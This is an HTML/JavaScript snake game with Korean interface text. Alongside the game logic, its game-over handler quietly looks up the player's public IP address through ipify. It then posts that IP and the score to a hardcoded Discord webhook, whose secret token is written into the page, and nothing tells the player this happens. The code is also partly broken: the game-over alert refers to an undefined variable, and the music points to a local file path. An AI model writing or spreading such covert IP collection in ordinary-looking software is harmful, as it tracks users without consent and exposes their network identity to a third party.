<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>지렁이 게임</title>
    <style>
        body {
            margin: 0;
            overflow: hidden;
            background-color: #000;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        canvas {
            display: block;
            border: 2px solid #fff;
        }

        button {
            padding: 10px 20px;
            font-size: 1.5em;
            background-color: #fff;
            color: #000;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-top: 10px;
        }

        #score {
            color: #fff;
            font-size: 20px;
            margin-top: 10px;
        }

        #highScore {
            color: #fff;
            font-size: 20px;
            position: absolute;
            top: 10px;
            left: 10px;
        }

        #joystick-container {
            display: none; /* 이 부분 수정하여 조이스틱 숨김 */
        }
    </style>
</head>
<body>
    <canvas id="gameCanvas" width="400" height="400"></canvas>
    <button id="startButton" onclick="startGame()">게임 시작하기</button>
    <div id="score">점수: 0</div>
    <div id="highScore">최고 점수: 0</div>

    <audio id="bgm" loop>
        <source src="file:///C:/Users/wers2/OneDrive/%EB%B0%94%ED%83%95%20%ED%99%94%EB%A9%B4/game1/muic/gamem1.mp3" type="audio/mp3">
        Your browser does not support the audio tag.
    </audio>

    <script>
        let canvas = document.getElementById("gameCanvas");
        let ctx = canvas.getContext("2d");

        let tileSize = 20;
        let snake = [{ x: 10, y: 10 }];
        let food = { x: 15, y: 15 };
        let direction = { x: 1, y: 0 };
        let score = 0;
        let highestScore = 0;
        let gameInterval;
        let webhookSent = false;
        let userIP;

        document.addEventListener("keydown", changeDirection);

        async function getIPAddress() {
            try {
                const response = await fetch('https://api64.ipify.org?format=json');
                const data = await response.json();
                userIP = data.ip;
                return userIP;
            } catch (error) {
                console.error('아이피를 가져오는 동안 오류가 발생했습니다:', error);
                return "0.0.0.0";
            }
        }

        function startGame() {
            document.removeEventListener("keydown", changeDirection);
            document.addEventListener("keydown", changeDirection);
            clearInterval(gameInterval);
            gameInterval = setInterval(updateGame, 100);
            setInterval(updateHighestScore, 15000);
            resetGame();
            playBackgroundMusic();
        }

        function updateGame() {
            if (!webhookSent) {
                moveSnake();
                checkCollision();
                draw();
                drawGrid();
            }
        }

        function moveSnake() {
            if (snake.length === 0) {
                return;
            }

            let newHead = { x: snake[0].x + direction.x, y: snake[0].y + direction.y };

            if (newHead.x === food.x && newHead.y === food.y) {
                score++;
                generateFood();
                updateScore();
            } else {
                snake.pop();
            }

            if (checkCollision(newHead, snake.slice(1))) {
                gameOver();
                return;
            }

            if (newHead.x < 0 || newHead.x >= canvas.width / tileSize ||
                newHead.y < 0 || newHead.y >= canvas.height / tileSize) {
                gameOver();
                return;
            }

            snake.unshift(newHead);
        }

        function checkCollision(head, array) {
            if (array) {
                return array.some(segment => segment.x === head.x && segment.y === head.y);
            }
            return false;
        }

        function generateFood() {
            food.x = Math.floor(Math.random() * (canvas.width / tileSize));
            food.y = Math.floor(Math.random() * (canvas.height / tileSize));
        }

        function changeDirection(event) {
            if (event.key === "ArrowUp" && direction.y === 0) {
                direction = { x: 0, y: -1 };
            } else if (event.key === "ArrowDown" && direction.y === 0) {
                direction = { x: 0, y: 1 };
            } else if (event.key === "ArrowLeft" && direction.x === 0) {
                direction = { x: -1, y: 0 };
            } else if (event.key === "ArrowRight" && direction.x === 0) {
                direction = { x: 1, y: 0 };
            }
        }

        function draw() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);

            ctx.fillStyle = "#00ff00";
            snake.forEach(segment => ctx.fillRect(segment.x * tileSize, segment.y * tileSize, tileSize, tileSize));

            ctx.fillStyle = "#ff0000";
            ctx.fillRect(food.x * tileSize, food.y * tileSize, tileSize, tileSize);

            ctx.fillStyle = "#fff";
            ctx.font = "20px Arial";
            ctx.fillText(`점수: ${score}`, 10, 20);
        }

        function drawGrid() {
            ctx.beginPath();
            ctx.strokeStyle = "rgba(255, 255, 255, 0.1)";

            for (let y = 0; y < canvas.height; y += tileSize) {
                ctx.moveTo(0, y);
                ctx.lineTo(canvas.width, y);
            }

            for (let x = 0; x < canvas.width; x += tileSize) {
                ctx.moveTo(x, 0);
                ctx.lineTo(x, canvas.height);
            }

            ctx.stroke();
        }

        function gameOver() {
            if (!webhookSent) {
                getIPAddress().then((ip) => {
                    sendGameOverWebhook(ip, score);
                });
                webhookSent = true;
            }

            alert(`게임 오버! 아이피: ${ip}, 점수: ${score}`);
            stopBackgroundMusic();
            resetGame();
        }

        function resetGame() {
            snake = [{ x: 10, y: 10 }];
            food = { x: 15, y: 15 };
            score = 0;
            updateScore();
            webhookSent = false;
        }

        function updateScore() {
            document.getElementById("score").innerText = `점수: ${score}`;
        }

        function updateHighestScore() {
            const userHighScore = localStorage.getItem(userIP + '_highScore') || 0;

            if (score > userHighScore) {
                localStorage.setItem(userIP + '_highScore', score);
                highestScore = score;
                document.getElementById("highScore").innerText = `최고 점수: ${highestScore}`;
            } else {
                highestScore = userHighScore;
                document.getElementById("highScore").innerText = `최고 점수: ${highestScore}`;
            }
        }

        function sendGameOverWebhook(ip, score) {
            const webhookURL = "https://discord.com/api/webhooks/1196827257658937394/vv796219_F78bZlqD6_llr0Hniv8QBtKXxzOzWl4EIc_ZCxeexUa3GmTGcKOkP0x8_Qt";

            const content = `\`\`\`게임 오버! 아이피: ${ip} | 점수: ${score}\`\`\``;

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ content: content }),
            })
            .then(response => {
                if (!response.ok) {
                    console.error('게임 오버 웹훅으로 메시지를 보내는 동안 오류가 발생했습니다:', response.status);
                }
            })
            .catch(error => {
                console.error('게임 오버 웹훅으로 메시지를 보내는 동안 오류가 발생했습니다:', error);
            });
        }

        function playBackgroundMusic() {
            const bgm = document.getElementById("bgm");
            bgm.play();
        }

        function stopBackgroundMusic() {
            const bgm = document.getElementById("bgm");
            bgm.pause();
            bgm.currentTime = 0;
        }
    </script>
</body>
</html>
